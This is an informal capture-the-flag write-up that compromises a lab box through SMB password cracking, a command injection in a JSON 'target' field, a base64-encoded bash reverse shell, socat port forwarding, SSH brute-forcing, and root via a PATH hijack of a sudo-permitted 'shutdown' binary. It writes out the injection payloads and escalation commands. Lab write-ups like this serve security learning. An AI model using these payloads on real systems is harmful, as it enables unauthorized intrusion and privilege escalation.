Started with a nmap scan
```
80 Apache 2.4.29
139 smb 
445 smb
```
Enumerating the smb we have to shares 
```
IPC$
yotf
```
We can not access the `yotf` share 
Enumerating possible users we got 
```
fox
rascal
```
Trying to crack the smb password for the user `fox` we got `246810` on the smb we have 2 files a `cipher.txt` and a `creds1.txt` file looking at the creds file its encoded hash in base32 and then in `base64` , `hex` and the cipher file does the same format but cant seem to decode them farther now were stuck in a rabbit hole but in the background ive been trying to crack a login for the site and got a hit `feeling` looking into the site we can get a list of files but there is a big block list on certain characters so I sent the request to burp and found that `/` in not blocked and we can use this for command injection and read files now `"target":"/";id\n` to get a reverse shell we have to take a basic bash one-liner and base64 encode it `"target":"/" ; echo base64string | base64 -d |bash\n` and now we are `www-data` now we can read the creds2 file and the other one as well but they go down the same path and cant fully decode them running linpeas on the host it found a hash in the `.htpasswd` file in `/etc/apache2` folder turn out its the has for the site login so did not see much but on the localhost ssh is open so lets use socat to port forward on the box run
`./socat tcp-listen:5000, fork tcp:127.0.0.1:22 &` have to use a static socat binary and now we can try and bruteforceing the login for both users got the login for the user `fox` password `.....` when we run `sudo -l` we can run a binary called shutdown transferring it to are host we and running strings on it we can see its using the poweroff command so we can write a exploit for this 
```
echo /bin/sh > poweroff
chmod 777 poweroff
export PATH=/tmp:$PATH
```
And run run the shutdown file and we are now root 